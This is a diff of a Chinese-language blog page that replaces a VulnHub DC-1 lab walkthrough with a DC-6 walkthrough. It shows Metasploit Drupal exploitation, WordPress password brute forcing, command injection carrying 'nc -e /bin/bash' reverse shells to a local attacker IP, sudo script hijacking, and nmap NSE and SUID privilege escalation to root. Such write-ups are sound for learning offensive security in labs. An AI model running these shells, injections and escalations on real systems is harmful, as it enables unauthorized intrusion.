@@ -10,7 +10,7 @@
     
     
     
-    <title>DC1Try | Hexo</title>
+    <title>DC6-Try | Hexo</title>
     <!-- inject:style -->
     <link href="/css/style.css" rel="stylesheet" type="text/css">
     <!-- endinject -->
@@ -161,13 +161,13 @@
     <div class="cube-content">
         <div class="cube-left">
             <div class="cube-article">
-    <h1 class="title">DC1Try</h1>
+    <h1 class="title">DC6-Try</h1>
         
             <div class="cube-article-header">
                 <div class="cube-article-date">
                     <i class="cube-icon cube-icon-date" aria-hidden="true"></i>
                     <!-- moment.js对象 -->
-                    2024-07-25
+                    2024-07-29
                 </div>
                 <div class="cube-article-tags">
     <i class="cube-icon cube-icon-tag" aria-hidden="true"></i>
@@ -177,167 +177,99 @@
             
                     <div class="cube-article-content cube-markdown">
                         
-                            <h1 id="1下载dc1"><a href="#1下载dc1" class="headerlink" title="1下载dc1"></a>1下载dc1</h1><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p>
-<p>设置kali与dc机为net</p>
-<h1 id="2信息收集"><a href="#2信息收集" class="headerlink" title="2信息收集"></a>2信息收集</h1><p>1.看靶机的ip</p>
+                            <h1 id="1信息收集"><a href="#1信息收集" class="headerlink" title="1信息收集"></a>1信息收集</h1><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a></p>
+<p>(1)看ip</p>
+<p>先 </p>
 <span id="more"></span>
 
-<p>net是在同一个网段</p>
-<p>kali是192.168.49.129    49网段</p>
-<p>看ip   ip addr  ifconfig   eth0就是你的网段</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.49.0/24</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.49.0/24</span><br><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2024/07/25/DC1Try/1.png" alt="DC1Try"></p>
-<p>另外一个命令也可以看靶机ip</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+<p>这个两个好像是扫的是同网段的</p>
+<p>看到135</p>
+<p>netdiscover  这个扫所有的的ip</p>
+<p>（2）扫端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -A -n 192.168.49.135</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2024/07/25/DC1Try/2.png" alt="DC1Try"></p>
-<p>排除1，2，129，254  知道cd机为 130</p>
-<p>2 查看ip后看靶机开启了端口</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.49.130</span><br></pre></td></tr></table></figure>
+<p>看到 22，80</p>
+<p>访问不行，被重定向，hosts改一下就行</p>
+<p>可以了</p>
+<p>用插件看到wordpress框架</p>
+<p><img src="/2024/07/29/DC6-Try/1.png" alt="DC6-Try"></p>
+<p>用他的专属工具</p>
+<p>在此之前扫个目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://wordy/     </span><br></pre></td></tr></table></figure>
 
-<p>-A 有点激进  启动了太多扫描，如版本，脚本等</p>
-<p><img src="/2024/07/25/DC1Try/3.png" alt="DC1Try"></p>
-<p>看到22，80，111三个端口 ssh，http，还有一个未知</p>
-<p>3  访问ip</p>
-<p>看到网站</p>
-<p>sql。xss试了试不行</p>
-<p>dirsearch 扫一下没啥东西</p>
-<p>3  指纹识别 whatweb</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb -v 192.168.49.130</span><br></pre></td></tr></table></figure>
+<p>有admin.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://wordy/ -w pa.txt   </span><br></pre></td></tr></table></figure>
 
-<p><img src="/2024/07/25/DC1Try/4.png" alt="DC1Try"></p>
-<p>MetaGenerator   Drupal 7</p>
-<p>看到了cms版本还有名字</p>
-<p>4 漏洞利用</p>
-<p>看看msf有没有现成模块</p>
-<p>（1）进入msf</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<p>找到密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url  http://wordy -e u      </span><br></pre></td></tr></table></figure>
 
-<p>（2）查找相应模块</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search Drupal</span><br></pre></td></tr></table></figure>
+<p>找到user，5个用户名</p>
+<p><img src="/2024/07/29/DC6-Try/2.png" alt="DC6-Try"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;admin&quot; &gt;&gt; &#x27;us.txt&#x27;</span><br><span class="line">echo &quot;mark&quot; &gt;&gt; &#x27;us.txt&#x27;</span><br><span class="line">echo &quot;jens&quot; &gt;&gt; &#x27;us.txt&#x27;</span><br><span class="line">echo &quot;graham&quot; &gt;&gt; &#x27;us.txt&#x27;</span><br><span class="line">echo &quot;sarah&quot; &gt;&gt; &#x27;us.txt&#x27;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2024/07/25/DC1Try/5.png" alt="DC1Try"></p>
-<p>这个有8个相应模块 一个一个试 发现第五个可以 exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2</p>
-<p>（3）使用相应模块</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url  http://wordy  -U us.txt -P pa.txt</span><br></pre></td></tr></table></figure>
 
-<p>（4）查看payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show payloads</span><br></pre></td></tr></table></figure>
+<p>发现爆不出来</p>
+<p>这个时候你下载镜像的时候有一个线索</p>
+<p>OK, this isn’t really a clue as such, but more of some “we don’t want to spend five years waiting for a certain process to finish” kind of advice for those who just want to get on with the job.</p>
+<p>好吧，这并不是一个真正的线索，但更多的是“我们不想花五年时间等待某个过程完成”的建议，对于那些只想继续工作的人来说。</p>
+<p>cat &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/wordlists</span><br><span class="line">ls</span><br><span class="line">看到rockyou.txt.gz</span><br><span class="line">gunzip rockyou.txt.gz</span><br><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br><span class="line">搜索rockyou.txt包含k01字符的写入一个文本</span><br><span class="line">grep是 搜索的意思</span><br><span class="line">wpscan --url http://wordy -U us.txt -P passwords.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2024/07/25/DC1Try/6.png" alt="DC1Try"></p>
-<p>看到这个php&#x2F;meterpreter&#x2F;reverse_tcp 这个不是老行家</p>
-<p>（5）使用payload</p>
-<p>注意  他的payload试这个 payload要和后面的路径有个空格payloadphp&#x2F;meterpreter&#x2F;reverse_tcp</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload php/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+<p>爆出来   Username: mark, Password: helpdesk01 </p>
+<p>登录</p>
+<p><img src="C:\Users\86139\AppData\Roaming\Typora\typora-user-images\image-20240729115647052.png" alt="image-20240729115647052"></p>
+<p>activity_monitor 这个插件有一个漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit activity monitor</span><br></pre></td></tr></table></figure>
 
-<p>（6）查看需要配置的参数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
+<p>看到历史漏洞</p>
+<p>尝试 html没反弹成功</p>
+<p>用哪个py代码，是一个远程登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp  /usr/share/exploitdb/exploits/php/webapps/50110.py  ./      </span><br></pre></td></tr></table></figure>
 
-<p><img src="/2024/07/25/DC1Try/7.png" alt="DC1Try"></p>
-<p>yes的试必须要填的，no的可以不填</p>
-<p>这里一个rhosts需要填</p>
-<p>（7）配置</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.49.130</span><br></pre></td></tr></table></figure>
-
-<p>(8)启动</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/07/25/DC1Try/8.png" alt="DC1Try"></p>
-<p>session建立</p>
-<p>5 操作dc机</p>
-<p>查看dc-1的基本信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure>
-
-<p>获取shell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
-
-<p>python反弹操作</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/07/25/DC1Try/9.png" alt="DC1Try"></p>
-<p>ls</p>
-<p>看到flag1.txt</p>
-<p>cat 看一下</p>
-<p>让我们看config file   （setting.php）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -name &quot;set*&quot;</span><br></pre></td></tr></table></figure>
-
-<p>搜到一个 .&#x2F;sites&#x2F;default&#x2F;settings.php</p>
 <p>cat 一下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ./sites/default/settings.php</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/07/29/DC6-Try/3.png" alt="DC6-Try"></p>
+<p>把爆出来的账号密码试了一下</p>
+<p>ip为dc机ip</p>
+<p>但是运行py文件 让你手动输入账号密码ip</p>
+<p>运行可以得到shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">再 nc -e /bin/bash 192.168.49.129 9999</span><br></pre></td></tr></table></figure>
 
-<p>flag2</p>
-<ul>
-<li>Brute force and dictionary attacks aren’t the</li>
-<li>only ways to gain access (and you WILL need access).</li>
-<li>What can you do with these credentials?</li>
-<li>*&#x2F;</li>
-</ul>
-<p>$databases &#x3D; array (<br>  ‘default’ &#x3D;&gt;<br>  array (<br>    ‘default’ &#x3D;&gt;<br>    array (<br>      ‘database’ &#x3D;&gt; ‘drupaldb’,<br>      ‘username’ &#x3D;&gt; ‘dbuser’,<br>      ‘password’ &#x3D;&gt; ‘R0ck3t’,<br>      ‘host’ &#x3D;&gt; ‘localhost’,<br>      ‘port’ &#x3D;&gt; ‘’,<br>      ‘driver’ &#x3D;&gt; ‘mysql’,<br>      ‘prefix’ &#x3D;&gt; ‘’,<br>    ),<br>  ),<br>);</p>
-<p>一个sql数据库</p>
-<p>flag2 说的网站不能爆破</p>
-<p>那用数据库的user</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line">show databases;</span><br><span class="line">use drupaldb;</span><br><span class="line">show tables;</span><br></pre></td></tr></table></figure>
+<p>kali  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvnp 9999</span><br><span class="line">python  -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">进入交互模式</span><br><span class="line"> find / -user root -perm -4000 2&gt;/dev/null</span><br><span class="line"> 看到没啥sudo也没法直接利用</span><br><span class="line"> 一般的suid提权 nmap，vim，find，bash，more，less，nano，cp</span><br></pre></td></tr></table></figure>
 
-<p>看到users表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users\G;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cd /home</span><br><span class="line">ls</span><br><span class="line">有四个用户</span><br><span class="line">ls -al  user</span><br><span class="line">看到  jens  有一个 backups.sh</span><br><span class="line">看到mark 有一个 stuff</span><br><span class="line">cat 一下backups.sh没权限</span><br><span class="line">看一下 stuff</span><br><span class="line">有一个txt文件</span><br><span class="line">看到 Add new user: graham - GSo7isUM1D4 - done</span><br><span class="line">知道了 一个账号密码</span><br><span class="line">su graham  输入密码</span><br><span class="line">sudo -l  看一下可执行命令</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>\G的作用将查到的结构旋转90度变成纵向</p>
-<p>看到admin</p>
-<p>pass被加密</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -name &quot;*hash*&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/07/29/DC6-Try/4.png" alt="DC6-Try"></p>
+<p> (jens) NOPASSWD: &#x2F;home&#x2F;jens&#x2F;backups.sh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /home/jens</span><br><span class="line">echo &quot;/bin/bash&quot; &gt;&gt; backups.sh</span><br><span class="line">sudo -u jens ./backups.sh</span><br><span class="line">切换到jens</span><br><span class="line">sudo -l</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>.&#x2F;scripts&#x2F;password-hash.sh</p>
-<p>直接运行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scripts/password-hash.sh</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/07/29/DC6-Try/5.png" alt="DC6-Try"></p>
+<p>  (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;nmap</p>
+<p>看到nmap</p>
+<p>–script: 指定自己的脚本文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;os.execute(&quot;/bin/bash&quot;)&#x27; &gt; shell.nse</span><br><span class="line">创建以恶搞shell.nse文件</span><br><span class="line">sudo -u root nmap --script=shell.nse   以root用户执行namp</span><br><span class="line">获得root</span><br><span class="line">cd /root</span><br><span class="line">cat theflag*</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>“<password1>“ [“<password2>“ [“<password3>“ …]]</p>
-<pre><code>          One or more plan-text passwords enclosed by double quotes. The
-          output hash may be manually entered into the &#123;users&#125;.pass field to
-          change a password via SQL to a known value.
-</code></pre>
-<p>这个意思是可以改pass的值</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scripts/password-hash.sh 123456</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/07/29/DC6-Try/6.png" alt="DC6-Try"></p>
+<p>#!&#x2F;bin&#x2F;bash  用&#x2F;bin&#x2F;bash这个脚本来执行任务</p>
+<p>grep 搜索</p>
+<p>html获得shell没成</p>
+<p>但还有一个获取shell的机会</p>
+<p><img src="/2024/07/29/DC6-Try/7.png" alt="DC6-Try"></p>
+<p>activity momitor的tools 这里有一个</p>
+<p>提交ip的地方</p>
+<p>bp抓包</p>
+<p><img src="/2024/07/29/DC6-Try/8.png" alt="DC6-Try"></p>
+<p>ip这个地方|加命令可以执行 souhu.com|whoami</p>
+<p><img src="/2024/07/29/DC6-Try/9.png" alt="DC6-Try"></p>
+<p>souhu.com|nc -e &#x2F;bin&#x2F;bash 192.168.49.129 6666</p>
+<p>kali nc一下就可shell</p>
+<p><img src="/2024/07/29/DC6-Try/10.png" alt="DC6-Try"></p>
+<p>得到shell后反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.49.129 6666</span><br><span class="line">nc -e /bin/sh 192.168.49.129 6666</span><br><span class="line">这两个都可以</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>先生成一个hash</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set pass=&#x27;$S$DIYW.qb1fomQ6ryTAXudbfVFgO1QsmRjD1jC6JnFl6o1vegBlwjR&#x27; where name=&quot;admin&quot;</span><br></pre></td></tr></table></figure>
-
-<p>把admin密码换成123456</p>
-<p>访问网站登录</p>
-<p>首页有一个flag3</p>
-<p>看到Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p>
-<p>shadow  &#x2F;etc&#x2F;passwd</p>
-<p>cat &#x2F;etc&#x2F;passwd</p>
-<p>有一个flag4   后面跟了一个路径 &#x2F;home&#x2F;flag4</p>
-<p>cd &#x2F;home&#x2F;flag4</p>
-<p>ls</p>
-<p>发现flag4.txt</p>
-<p>cat flag4.txt</p>
-<p>Can you use this same method to find or access the flag in root?</p>
-<p>Probably. But perhaps it’s not that easy.  Or maybe it is?</p>
-<p>让你访问root下的flag</p>
-<p>直接suid提权为root才可以访问&#x2F;root</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<p>从&#x2F;开始找 -perm 权限 -u&#x3D;s 意思是 用户有特权  -type f就是找的是文件</p>
-<p>2&gt;&#x2F;dev&#x2F;null过滤错误信息</p>
-<p>看到find有s权限</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -exec &quot;/bin/bash&quot; -p \;</span><br></pre></td></tr></table></figure>
-
-<p>发现有执行权限的文件 -p \ 不清楚</p>
-<p>但获得root权限</p>
-<p>根据提示</p>
-<p>cd &#x2F;root</p>
-<p>ls</p>
-<p>cat thefinalflag.txt</p>
-<p>这个靶机就打完了</p>
-<p>总结</p>
-<p>1 nmap，arp-scan 使用</p>
-<p>2 whatweb 指纹识别</p>
-<p>3 sf使用模块payload</p>
-<p>update users set pass&#x3D;’S SSDFTjE6MQfJJx3er.iWGVcIIZD8XvaFmGM.F7ZiDbPlxpC.&#x2F;1X&#x2F;HC’where name&#x3D;“admin”;</p>
-<p>4 mysql修改数据   update users set pass&#x3D;”111” where name&#x3D;”admin”</p>
-<p>5 suid提权</p>
 
                     </div>
 </div>
@@ -345,17 +277,10 @@
     <div class="cube-article-nav">
         <ul>
             
-                <li class="prev">
-                    <a href="/2024/07/26/DC-2Try/">
-                        <i class="cube-icon cube-prev" aria-hidden="true"></i>
-                        DC-2Try
-                    </a>
-                </li>
-                
                     
                         <li class="next">
-                            <a href="/2024/07/08/ciscn-sanic-py%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
-                                ciscn sanic py原型链污染
+                            <a href="/2024/07/28/DC5-Try/">
+                                DC5-Try
                                     <i class="cube-icon cube-next" aria-hidden="true"></i>
                             </a>
                         </li>
